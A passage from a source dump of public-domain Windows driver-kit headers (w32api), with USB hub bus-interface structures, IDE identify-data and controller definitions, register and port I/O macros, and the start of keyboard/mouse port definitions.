  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
  PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION GetControllerInformation;
  PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND ControllerSelectiveSuspend;
  PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO GetExtendedHubInformation;
  PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME GetRootHubSymbolicName;
  PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT GetDeviceBusContext;
  PUSB_BUSIFFN_INITIALIZE_20HUB Initialize20Hub;
  PUSB_BUSIFFN_ROOTHUB_INIT_NOTIFY RootHubInitNotification;
  PUSB_BUSIFFN_FLUSH_TRANSFERS FlushTransfers;
  PUSB_BUSIFFN_SET_DEVHANDLE_DATA SetDeviceHandleData;
} USB_BUS_INTERFACE_HUB_V5, *PUSB_BUS_INTERFACE_HUB_V5;

typedef struct _USB_BUS_INTERFACE_HUB_V6 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE_EX CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE_EX InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
  PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION GetControllerInformation;
  PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND ControllerSelectiveSuspend;
  PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO GetExtendedHubInformation;
  PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME GetRootHubSymbolicName;
  PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT GetDeviceBusContext;
  PUSB_BUSIFFN_INITIALIZE_20HUB Initialize20Hub;
  PUSB_BUSIFFN_ROOTHUB_INIT_NOTIFY RootHubInitNotification;
  PUSB_BUSIFFN_FLUSH_TRANSFERS FlushTransfers;
  PUSB_BUSIFFN_SET_DEVHANDLE_DATA SetDeviceHandleData;
  PUSB_BUSIFFN_IS_ROOT HubIsRoot;
  PUSB_BUSIFFN_ACQUIRE_SEMAPHORE AcquireBusSemaphore;
  PUSB_BUSIFFN_RELEASE_SEMAPHORE ReleaseBusSemaphore;
  PUSB_BUSIFFN_CALC_PIPE_BANDWIDTH CaculatePipeBandwidth;
  PUSB_BUSIFFN_SET_BUS_WAKE_MODE SetBusSystemWakeMode;
  PUSB_BUSIFFN_SET_DEVICE_FLAG SetDeviceFlag;
  PUSB_BUSIFFN_TEST_POINT HubTestPoint;
  PUSB_BUSIFFN_GET_DEVICE_PERFORMANCE_INFO GetDevicePerformanceInfo;
  PUSB_BUSIFFN_WAIT_ASYNC_POWERUP WaitAsyncPowerUp;
  PUSB_BUSIFFN_GET_DEVICE_ADDRESS GetDeviceAddress;
  PUSB_BUSIFFN_REF_DEVICE_HANDLE RefDeviceHandle;
  PUSB_BUSIFFN_DEREF_DEVICE_HANDLE DerefDeviceHandle;
  PUSB_BUSIFFN_SET_DEVICE_HANDLE_IDLE_READY_STATE SetDeviceHandleIdleReadyState;
} USB_BUS_INTERFACE_HUB_V6, *PUSB_BUS_INTERFACE_HUB_V6;

typedef struct _USB_BUS_INTERFACE_HUB_V7 {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_CREATE_USB_DEVICE_EX CreateUsbDevice;
  PUSB_BUSIFFN_INITIALIZE_USB_DEVICE_EX InitializeUsbDevice;
  PUSB_BUSIFFN_GET_USB_DESCRIPTORS GetUsbDescriptors;
  PUSB_BUSIFFN_REMOVE_USB_DEVICE RemoveUsbDevice;
  PUSB_BUSIFFN_RESTORE_DEVICE RestoreUsbDevice;
  PUSB_BUSIFFN_GET_POTRTHACK_FLAGS GetPortHackFlags;
  PUSB_BUSIFFN_GET_DEVICE_INFORMATION QueryDeviceInformation;
  PUSB_BUSIFFN_GET_CONTROLLER_INFORMATION GetControllerInformation;
  PUSB_BUSIFFN_CONTROLLER_SELECTIVE_SUSPEND ControllerSelectiveSuspend;
  PUSB_BUSIFFN_GET_EXTENDED_HUB_INFO GetExtendedHubInformation;
  PUSB_BUSIFFN_GET_ROOTHUB_SYM_NAME GetRootHubSymbolicName;
  PUSB_BUSIFFN_GET_DEVICE_BUSCONTEXT GetDeviceBusContext;
  PUSB_BUSIFFN_INITIALIZE_20HUB Initialize20Hub;
  PUSB_BUSIFFN_ROOTHUB_INIT_NOTIFY RootHubInitNotification;
  PUSB_BUSIFFN_FLUSH_TRANSFERS FlushTransfers;
  PUSB_BUSIFFN_SET_DEVHANDLE_DATA SetDeviceHandleData;
  PUSB_BUSIFFN_IS_ROOT HubIsRoot;
  PUSB_BUSIFFN_ACQUIRE_SEMAPHORE AcquireBusSemaphore;
  PUSB_BUSIFFN_RELEASE_SEMAPHORE ReleaseBusSemaphore;
  PUSB_BUSIFFN_CALC_PIPE_BANDWIDTH CaculatePipeBandwidth;
  PUSB_BUSIFFN_SET_BUS_WAKE_MODE SetBusSystemWakeMode;
  PUSB_BUSIFFN_SET_DEVICE_FLAG SetDeviceFlag;
  PUSB_BUSIFFN_TEST_POINT HubTestPoint;
  PUSB_BUSIFFN_GET_DEVICE_PERFORMANCE_INFO GetDevicePerformanceInfo;
  PUSB_BUSIFFN_WAIT_ASYNC_POWERUP WaitAsyncPowerUp;
  PUSB_BUSIFFN_GET_DEVICE_ADDRESS GetDeviceAddress;
  PUSB_BUSIFFN_REF_DEVICE_HANDLE RefDeviceHandle;
  PUSB_BUSIFFN_DEREF_DEVICE_HANDLE DerefDeviceHandle;
  PUSB_BUSIFFN_SET_DEVICE_HANDLE_IDLE_READY_STATE SetDeviceHandleIdleReadyState;
  PUSB_BUSIFFN_CREATE_USB_DEVICE_V7 CreateUsbDeviceV7;
  PUSB_BUSIFFN_GET_CONTAINER_ID_FOR_PORT GetContainerIdForPort;
  PUSB_BUSIFFN_SET_CONTAINER_ID_FOR_PORT SetContainerIdForPort;
  PUSB_BUSIFFN_ABORT_ALL_DEVICE_PIPES AbortAllDevicePipes;
  PUSB_BUSIFFN_SET_DEVICE_ERRATA_FLAG SetDeviceErrataFlag;
} USB_BUS_INTERFACE_HUB_V7, *PUSB_BUS_INTERFACE_HUB_V7;

DEFINE_GUID(USB_BUS_INTERFACE_HUB_MINIDUMP_GUID,
	0xc5485f21, 0x4e81, 0x4a23, 0xa8, 0xf9, 0xd8, 0x51, 0x8a, 0xf4, 0x5c, 0x38);

typedef VOID
(USB_BUSIFFN *PUSB_BUSIFFN_SET_MINIDUMP_FLAGS) (
  IN PVOID);

typedef struct _USB_BUS_INTERFACE_HUB_MINIDUMP {
  USHORT Size;
  USHORT Version;
  PVOID BusContext;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PUSB_BUSIFFN_SET_MINIDUMP_FLAGS SetUsbPortMiniDumpFlags;
} USB_BUS_INTERFACE_HUB_MINIDUMP, *PUSB_BUS_INTERFACE_HUB_MINIDUMP;

DEFINE_GUID(USB_BUS_INTERFACE_HUB_SS_GUID, 
	0xbfc3f363, 0x8ba1, 0x4c7b, 0x97, 0xba, 0x9b, 0x12, 0xb1, 0xca, 0x13, 0x2f);

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_SUSPEND_HUB) (
  PDEVICE_OBJECT Pdo);

typedef NTSTATUS
(USB_BUSIFFN *PUSB_BUSIFFN_RESUME_HUB) (
  PDEVICE_OBJECT Pdo);

typedef struct _USB_BUS_INTERFACE_HUB_SELECTIVE_SUSPEND {
  USHORT Size;
  USHORT Version;
  PVOID  BusContext;
  PINTERFACE_REFERENCE  InterfaceReference;
  PINTERFACE_DEREFERENCE  InterfaceDereference;
  PUSB_BUSIFFN_SUSPEND_HUB  SuspendHub;
  PUSB_BUSIFFN_RESUME_HUB  ResumeHub;
} USB_BUS_INTERFACE_HUB_SELECTIVE_SUSPEND, *PUSB_BUS_INTERFACE_HUB_SELECTIVE_SUSPEND;

#include <pshpack1.h>

typedef struct _USB_PIPE_INFORMATION_0 {
  USB_ENDPOINT_DESCRIPTOR  EndpointDescriptor;
  UCHAR  ED_Pad[1];
  ULONG  ScheduleOffset;
} USB_PIPE_INFORMATION_0, *PUSB_PIPE_INFORMATION_0;

typedef struct _USB_LEVEL_INFORMATION {
  ULONG  InformationLevel;
  ULONG  ActualLength;
} USB_LEVEL_INFORMATION, *PUSB_LEVEL_INFORMATION;

typedef struct _USB_DEVICE_INFORMATION_0 {
  ULONG  InformationLevel;
  ULONG  ActualLength;
  ULONG  PortNumber;
  USB_DEVICE_DESCRIPTOR  DeviceDescriptor;
  UCHAR  DD_pad[2];
  UCHAR  CurrentConfigurationValue;
  UCHAR  ReservedMBZ;
  USHORT DeviceAddress;
  ULONG  HubAddress;
  USB_DEVICE_SPEED  DeviceSpeed;
  USB_DEVICE_TYPE  DeviceType;
  ULONG  NumberOfOpenPipes;
  USB_PIPE_INFORMATION_0  PipeList[1];
} USB_DEVICE_INFORMATION_0, *PUSB_DEVICE_INFORMATION_0;

typedef struct _USB_CONTROLLER_INFORMATION_0 {
  ULONG  InformationLevel;
  ULONG  ActualLength;
  BOOLEAN SelectiveSuspendEnabled;
  BOOLEAN IsHighSpeedController;
} USB_CONTROLLER_INFORMATION_0, *PUSB_CONTROLLER_INFORMATION_0;

typedef struct _USB_CONTROLLER_INFORMATION_1 {
  ULONG  InformationLevel;
  ULONG  ActualLength;
  BOOLEAN SelectiveSuspendEnabled;
  BOOLEAN IsHighSpeedController;
  ULONG  HcBusNumber;
  ULONG  HcBusDevice;
  ULONG  HcBusFunction;
} USB_CONTROLLER_INFORMATION_1, *PUSB_CONTROLLER_INFORMATION_1;

typedef struct _USB_EXTPORT_INFORMATION_0 {
  ULONG  PhysicalPortNumber;
  ULONG  PortLabelNumber;
  USHORT VidOverride;
  USHORT PidOverride;
  ULONG  PortAttributes;
} USB_EXTPORT_INFORMATION_0, *PUSB_EXTPORT_INFORMATION;

typedef struct _USB_EXTHUB_INFORMATION_0 {
  ULONG  InformationLevel;
  ULONG  NumberOfPorts;
  USB_EXTPORT_INFORMATION_0  Port[255];
} USB_EXTHUB_INFORMATION_0, *PUSB_EXTHUB_INFORMATION_0;

typedef struct _USB_DEVICE_PERFORMANCE_INFO_0 {
  ULONG  InformationLevel;
  ULONG  ActualLength;
  ULONG  BulkBytes;
  ULONG  BulkUrbCount;
  ULONG  ControlDataBytes;
  ULONG  ControlUrbCount;
  ULONG  IsoBytes;
  ULONG  IsoUrbCount;
  ULONG  InterruptBytes;
  ULONG  InterruptUrbCount;
  ULONG  AllocedInterrupt[6];
  ULONG  AllocedIso;
  ULONG  Total32secBandwidth;
  ULONG  TotalTtBandwidth;
  ULONG  TotalIsoLatency;
  ULONG  DroppedIsoPackets;
  ULONG  TransferErrors;
} USB_DEVICE_PERFORMANCE_INFO_0, *PUSB_DEVICE_PERFORMANCE_INFO_0;

#include <poppack.h>

#endif /* NTDDI_VERSION >= NTDDI_WINXP */


```

`include/ddk/ide.h`:

```h
/*
 * ide.h
 *
 * IDE driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Hervé Poussineau <hpoussin@reactos.org>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __IDE_H
#define __IDE_H

#ifdef __cplusplus
extern "C" {
#endif

#define MAX_IDE_CHANNEL   2
#define MAX_IDE_LINE      2
#define MAX_IDE_DEVICE    2

#include <pshpack1.h>
typedef struct _IDENTIFY_DATA {
  USHORT GeneralConfiguration;       /* 00 */
  USHORT NumCylinders;               /* 02 */
  USHORT Reserved1;                  /* 04 */
  USHORT NumHeads;                   /* 06 */
  USHORT UnformattedBytesPerTrack;   /* 08 */
  USHORT UnformattedBytesPerSector;  /* 10 */
  USHORT NumSectorsPerTrack;         /* 12 */
  USHORT VendorUnique1[3];           /* 14 */
  UCHAR  SerialNumber[20];           /* 20 */
  USHORT BufferType;                 /* 40 */
  USHORT BufferSectorSize;           /* 42 */
  USHORT NumberOfEccBytes;           /* 44 */
  UCHAR  FirmwareRevision[8];        /* 46 */
  UCHAR  ModelNumber[40];            /* 54 */
  UCHAR  MaximumBlockTransfer;       /* 94 */
  UCHAR  VendorUnique2;              /* 95 */
  USHORT DoubleWordIo;               /* 96 */
  USHORT Capabilities;               /* 98 */
  USHORT Reserved2;                  /* 100 */
  UCHAR  VendorUnique3;              /* 102 */
  UCHAR  PioCycleTimingMode;         /* 103 */
  UCHAR  VendorUnique4;              /* 104 */
  UCHAR  DmaCycleTimingMode;         /* 105 */
  USHORT TranslationFieldsValid:3;   /* 106 */
  USHORT Reserved3:13;               /*  -  */
  USHORT NumberOfCurrentCylinders;   /* 108 */
  USHORT NumberOfCurrentHeads;       /* 110 */
  USHORT CurrentSectorsPerTrack;     /* 112 */
  ULONG  CurrentSectorCapacity;      /* 114 */
  USHORT CurrentMultiSectorSetting;  /* 118 */
  ULONG  UserAddressableSectors;     /* 120 */
  USHORT SingleWordDMASupport:8;     /* 124 */
  USHORT SingleWordDMAActive:8;      /*  -  */
  USHORT MultiWordDMASupport:8;      /* 126 */
  USHORT MultiWordDMAActive:8;       /*  -  */
  USHORT AdvancedPIOModes:8;         /* 128 */
  USHORT Reserved4:8;                /*  -  */
  USHORT MinimumMWXferCycleTime;     /* 130 */
  USHORT RecommendedMWXferCycleTime; /* 132 */
  USHORT MinimumPIOCycleTime;        /* 134 */
  USHORT MinimumPIOCycleTimeIORDY;   /* 136 */
  USHORT Reserved5[11];              /* 138 */
  USHORT MajorRevision;              /* 160 */
  USHORT MinorRevision;              /* 162 */
  USHORT Reserved6;                  /* 164 */
  USHORT CommandSetSupport;          /* 166 */
  USHORT Reserved6a[2];              /* 168 */
  USHORT CommandSetActive;           /* 172 */
  USHORT Reserved6b;                 /* 174 */
  USHORT UltraDMASupport:8;          /* 176 */
  USHORT UltraDMAActive:8;           /*  -  */
  USHORT Reserved7[11];              /* 178 */
  ULONG  Max48BitLBA[2];             /* 200 */
  USHORT Reserved7a[22];             /* 208 */
  USHORT LastLun:3;                  /* 252 */
  USHORT Reserved8:13;               /*  -  */
  USHORT MediaStatusNotification:2;  /* 254 */
  USHORT Reserved9:6;                /*  -  */
  USHORT DeviceWriteProtect:1;       /*  -  */
  USHORT Reserved10:7;               /*  -  */
  USHORT Reserved11[128];            /* 256 */
} IDENTIFY_DATA, *PIDENTIFY_DATA;

typedef struct _EXTENDED_IDENTIFY_DATA {
  USHORT GeneralConfiguration;       /* 00 */
  USHORT NumCylinders;               /* 02 */
  USHORT Reserved1;                  /* 04 */
  USHORT NumHeads;                   /* 06 */
  USHORT UnformattedBytesPerTrack;   /* 08 */
  USHORT UnformattedBytesPerSector;  /* 10 */
  USHORT NumSectorsPerTrack;         /* 12 */
  __GNU_EXTENSION union
  {
    USHORT VendorUnique1[3];         /* 14 */
    struct
    {
      UCHAR InterSectorGap;          /* 14 */
      UCHAR InterSectorGapSize;      /* -  */
      UCHAR Reserved16;              /* 16 */
      UCHAR BytesInPLO;              /* -  */
      USHORT VendorUniqueCnt;        /* 18 */
    } u;
  };
  UCHAR  SerialNumber[20];           /* 20 */
  USHORT BufferType;                 /* 40 */
  USHORT BufferSectorSize;           /* 42 */
  USHORT NumberOfEccBytes;           /* 44 */
  UCHAR  FirmwareRevision[8];        /* 46 */
  UCHAR  ModelNumber[40];            /* 54 */
  UCHAR  MaximumBlockTransfer;       /* 94 */
  UCHAR  VendorUnique2;              /* 95 */
  USHORT DoubleWordIo;               /* 96 */
  USHORT Capabilities;               /* 98 */
  USHORT Reserved2;                  /* 100 */
  UCHAR  VendorUnique3;              /* 102 */
  UCHAR  PioCycleTimingMode;         /* 103 */
  UCHAR  VendorUnique4;              /* 104 */
  UCHAR  DmaCycleTimingMode;         /* 105 */
  USHORT TranslationFieldsValid:3;   /* 106 */
  USHORT Reserved3:13;               /*  -  */
  USHORT NumberOfCurrentCylinders;   /* 108 */
  USHORT NumberOfCurrentHeads;       /* 110 */
  USHORT CurrentSectorsPerTrack;     /* 112 */
  ULONG  CurrentSectorCapacity;      /* 114 */
  USHORT CurrentMultiSectorSetting;  /* 118 */
  ULONG  UserAddressableSectors;     /* 120 */
  USHORT SingleWordDMASupport:8;     /* 124 */
  USHORT SingleWordDMAActive:8;      /*  -  */
  USHORT MultiWordDMASupport:8;      /* 126 */
  USHORT MultiWordDMAActive:8;       /*  -  */
  USHORT AdvancedPIOModes:8;         /* 128 */
  USHORT Reserved4:8;                /*  -  */
  USHORT MinimumMWXferCycleTime;     /* 130 */
  USHORT RecommendedMWXferCycleTime; /* 132 */
  USHORT MinimumPIOCycleTime;        /* 134 */
  USHORT MinimumPIOCycleTimeIORDY;   /* 136 */
  USHORT Reserved5[11];              /* 138 */
  USHORT MajorRevision;              /* 160 */
  USHORT MinorRevision;              /* 162 */
  USHORT Reserved6;                  /* 164 */
  USHORT CommandSetSupport;          /* 166 */
  USHORT Reserved6a[2];              /* 168 */
  USHORT CommandSetActive;           /* 172 */
  USHORT Reserved6b;                 /* 174 */
  USHORT UltraDMASupport:8;          /* 176 */
  USHORT UltraDMAActive:8;           /*  -  */
  USHORT Reserved7[11];              /* 178 */
  ULONG  Max48BitLBA[2];             /* 200 */
  USHORT Reserved7a[22];             /* 208 */
  USHORT LastLun:3;                  /* 252 */
  USHORT Reserved8:13;               /*  -  */
  USHORT MediaStatusNotification:2;  /* 254 */
  USHORT Reserved9:6;                /*  -  */
  USHORT DeviceWriteProtect:1;       /*  -  */
  USHORT Reserved10:7;               /*  -  */
  USHORT Reserved11[128];            /* 256 */
} EXTENDED_IDENTIFY_DATA, *PEXTENDED_IDENTIFY_DATA;
#include <poppack.h>

typedef struct _PCIIDE_TRANSFER_MODE_SELECT
{
  ULONG Channel;
  BOOLEAN DevicePresent[MAX_IDE_DEVICE * MAX_IDE_LINE];
  BOOLEAN FixedDisk[MAX_IDE_DEVICE * MAX_IDE_LINE];
  BOOLEAN IoReadySupported[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG DeviceTransferModeSupported[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG BestPioCycleTime[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG BestSwDmaCycleTime[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG BestMwDmaCycleTime[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG BestUDmaCycleTime[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG DeviceTransferModeCurrent[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG UserChoiceTransferMode[MAX_IDE_DEVICE * MAX_IDE_LINE];
  ULONG EnableUDMA66;
  IDENTIFY_DATA IdentifyData[MAX_IDE_DEVICE];
  ULONG DeviceTransferModeSelected[MAX_IDE_DEVICE * MAX_IDE_LINE];
  PULONG TransferModeTimingTable;
  ULONG TransferModeTableLength;
} PCIIDE_TRANSFER_MODE_SELECT, *PPCIIDE_TRANSFER_MODE_SELECT;

typedef enum
{
  ChannelDisabled = 0,
  ChannelEnabled,
  ChannelStateUnknown
} IDE_CHANNEL_STATE;

typedef IDE_CHANNEL_STATE
(NTAPI *PCIIDE_CHANNEL_ENABLED)(
  IN PVOID DeviceExtension,
  IN ULONG Channel);

typedef BOOLEAN
(NTAPI *PCIIDE_SYNC_ACCESS_REQUIRED)(
  IN PVOID DeviceExtension);

typedef NTSTATUS
(NTAPI *PCIIDE_TRANSFER_MODE_SELECT_FUNC)(
  IN PVOID DeviceExtension,
  IN OUT PPCIIDE_TRANSFER_MODE_SELECT XferMode);

typedef ULONG
(NTAPI *PCIIDE_USEDMA_FUNC)(
  IN PVOID DeviceExtension,
  IN PUCHAR CdbCommand,
  IN PUCHAR Slave);

typedef NTSTATUS
(NTAPI *PCIIDE_UDMA_MODES_SUPPORTED)(
  IN IDENTIFY_DATA IdentifyData,
  OUT PULONG BestXferMode,
  OUT PULONG CurrentXferMode);

typedef struct _IDE_CONTROLLER_PROPERTIES
{
  ULONG Size;
  ULONG ExtensionSize;
  ULONG SupportedTransferMode[MAX_IDE_CHANNEL][MAX_IDE_DEVICE];
  PCIIDE_CHANNEL_ENABLED PciIdeChannelEnabled;
  PCIIDE_SYNC_ACCESS_REQUIRED PciIdeSyncAccessRequired;
  PCIIDE_TRANSFER_MODE_SELECT_FUNC PciIdeTransferModeSelect;
  BOOLEAN IgnoreActiveBitForAtaDevice;
  BOOLEAN AlwaysClearBusMasterInterrupt;
  PCIIDE_USEDMA_FUNC PciIdeUseDma;
  ULONG AlignmentRequirement;
  ULONG DefaultPIO;
  PCIIDE_UDMA_MODES_SUPPORTED PciIdeUdmaModesSupported;
} IDE_CONTROLLER_PROPERTIES, *PIDE_CONTROLLER_PROPERTIES;

typedef NTSTATUS
(NTAPI *PCONTROLLER_PROPERTIES)(
  IN PVOID DeviceExtension,
  IN PIDE_CONTROLLER_PROPERTIES ControllerProperties);

NTSTATUS NTAPI
PciIdeXInitialize(
  IN PDRIVER_OBJECT DriverObject,
  IN PUNICODE_STRING RegistryPath,
  IN PCONTROLLER_PROPERTIES HwGetControllerProperties,
  IN ULONG ExtensionSize);

NTSTATUS NTAPI
PciIdeXGetBusData(
  IN PVOID DeviceExtension,
  IN PVOID Buffer,
  IN ULONG ConfigDataOffset,
  IN ULONG BufferLength);

NTSTATUS NTAPI
PciIdeXSetBusData(
  IN PVOID DeviceExtension,
  IN PVOID Buffer,
  IN PVOID DataMask,
  IN ULONG ConfigDataOffset,
  IN ULONG BufferLength);

/* Bit field values for
 * PCIIDE_TRANSFER_MODE_SELECT.DeviceTransferModeSupported and
 * IDE_CONTROLLER_PROPERTIES.SupportedTransferMode
 */
// PIO Modes
#define PIO_MODE0   (1 << 0)
#define PIO_MODE1   (1 << 1)
#define PIO_MODE2   (1 << 2)
#define PIO_MODE3   (1 << 3)
#define PIO_MODE4   (1 << 4)
// Single-word DMA Modes
#define SWDMA_MODE0 (1 << 5)
#define SWDMA_MODE1 (1 << 6)
#define SWDMA_MODE2 (1 << 7)
// Multi-word DMA Modes
#define MWDMA_MODE0 (1 << 8)
#define MWDMA_MODE1 (1 << 9)
#define MWDMA_MODE2 (1 << 10)
// Ultra DMA Modes
#define UDMA_MODE0  (1 << 11)
#define UDMA_MODE1  (1 << 12)
#define UDMA_MODE2  (1 << 13)
#define UDMA_MODE3  (1 << 14)
#define UDMA_MODE4  (1 << 15)
#define UDMA_MODE5  (1 << 16)

#ifdef __cplusplus
}
#endif

#endif /* __IDE_H */

```

`include/ddk/ioaccess.h`:

```h
/*
 * ioaccess.h
 *
 * Windows Device Driver Kit
 *
 * This file is part of the w32api package.
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */
#ifndef __IOACCESS_H
#define __IOACCESS_H

#ifdef __cplusplus
extern "C" {
#endif

#define H2I(p) PtrToUshort(p)

#ifndef NO_PORT_MACROS

#if defined(_X86_) || defined(_M_AMD64)
#define READ_REGISTER_UCHAR(r) (*(volatile UCHAR *)(r))
#define READ_REGISTER_USHORT(r) (*(volatile USHORT *)(r))
#define READ_REGISTER_ULONG(r) (*(volatile ULONG *)(r))
#define WRITE_REGISTER_UCHAR(r, v) (*(volatile UCHAR *)(r) = (v))
#define WRITE_REGISTER_USHORT(r, v) (*(volatile USHORT *)(r) = (v))
#define WRITE_REGISTER_ULONG(r, v) (*(volatile ULONG *)(r) = (v))
#define READ_PORT_UCHAR(p) (UCHAR)(__inbyte (H2I(p)))
#define READ_PORT_USHORT(p) (USHORT)(__inword (H2I(p)))
#define READ_PORT_ULONG(p) (ULONG)(__indword (H2I(p)))
#define WRITE_PORT_UCHAR(p, v) __outbyte (H2I(p), (v))
#define WRITE_PORT_USHORT(p, v) __outword (H2I(p), (v))
#define WRITE_PORT_ULONG(p, v) __outdword (H2I(p), (v))

#define MEMORY_BARRIER()

#elif defined(_PPC_) || defined(_MIPS_) || defined(_ARM_)

#define READ_REGISTER_UCHAR(r)      (*(volatile UCHAR * const)(r))
#define READ_REGISTER_USHORT(r)     (*(volatile USHORT * const)(r))
#define READ_REGISTER_ULONG(r)      (*(volatile ULONG * const)(r))
#define WRITE_REGISTER_UCHAR(r, v)  (*(volatile UCHAR * const)(r) = (v))
#define WRITE_REGISTER_USHORT(r, v) (*(volatile USHORT * const)(r) = (v))
#define WRITE_REGISTER_ULONG(r, v)  (*(volatile ULONG * const)(r) = (v))
#define READ_PORT_UCHAR(r)          READ_REGISTER_UCHAR(r)
#define READ_PORT_USHORT(r)         READ_REGISTER_USHORT(r)
#define READ_PORT_ULONG(r)          READ_REGISTER_ULONG(r)
#define WRITE_PORT_UCHAR(p, v)      WRITE_REGISTER_UCHAR(p, (UCHAR) (v))
#define WRITE_PORT_USHORT(p, v)     WRITE_REGISTER_USHORT(p, (USHORT) (v))
#define WRITE_PORT_ULONG(p, v)      WRITE_REGISTER_ULONG(p, (ULONG) (v))

#else

#error Unsupported architecture

#endif

#endif /* NO_PORT_MACROS */

#ifdef __cplusplus
}
#endif

#endif /* __IOACCESS_H */

```

`include/ddk/kbdmou.h`:

```h
/*
 * kbdmou.h
 *
 * Structures and definitions for Keyboard/Mouse class and port drivers.
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Filip Navara <xnavara@volny.cz>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define _KBDMOU_

#include <ntddkbd.h>
#include <ntddmou.h>

#define DD_KEYBOARD_PORT_DEVICE_NAME      "\\Device\\KeyboardPort"
#define DD_KEYBOARD_PORT_DEVICE_NAME_U    L"\\Device\\KeyboardPort"
#define DD_KEYBOARD_PORT_BASE_NAME_U      L"KeyboardPort"
#define DD_POINTER_PORT_DEVICE_NAME       "\\Device\\PointerPort"
#define DD_POINTER_PORT_DEVICE_NAME_U     L"\\Device\\PointerPort"
#define DD_POINTER_PORT_BASE_NAME_U       L"PointerPort"

#define DD_KEYBOARD_CLASS_BASE_NAME_U     L"KeyboardClass"
#define DD_POINTER_CLASS_BASE_NAME_U      L"PointerClass"

#define DD_KEYBOARD_RESOURCE_CLASS_NAME_U             L"Keyboard"
#define DD_POINTER_RESOURCE_CLASS_NAME_U              L"Pointer"
#define DD_KEYBOARD_MOUSE_COMBO_RESOURCE_CLASS_NAME_U L"Keyboard/Pointer"

#define POINTER_PORTS_MAXIMUM             8
#define KEYBOARD_PORTS_MAXIMUM            8

#define KBDMOU_COULD_NOT_SEND_COMMAND     0x0000
#define KBDMOU_COULD_NOT_SEND_PARAM       0x0001
#define KBDMOU_NO_RESPONSE                0x0002
#define KBDMOU_INCORRECT_RESPONSE         0x0004

#define I8042_ERROR_VALUE_BASE            1000
#define INPORT_ERROR_VALUE_BASE           2000
#define SERIAL_MOUSE_ERROR_VALUE_BASE     3000

#define IOCTL_INTERNAL_KEYBOARD_CONNECT \
  CTL_CODE(FILE_DEVICE_KEYBOARD, 0x0080, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_INTERNAL_KEYBOARD_DISCONNECT \
  CTL_CODE(FILE_DEVICE_KEYBOARD,0x0100, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_INTERNAL_KEYBOARD_ENABLE \
  CTL_CODE(FILE_DEVICE_KEYBOARD, 0x0200, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_INTERNAL_KEYBOARD_DISABLE \
  CTL_CODE(FILE_DEVICE_KEYBOARD, 0x0400, METHOD_NEITHER, FILE_ANY_ACCESS)

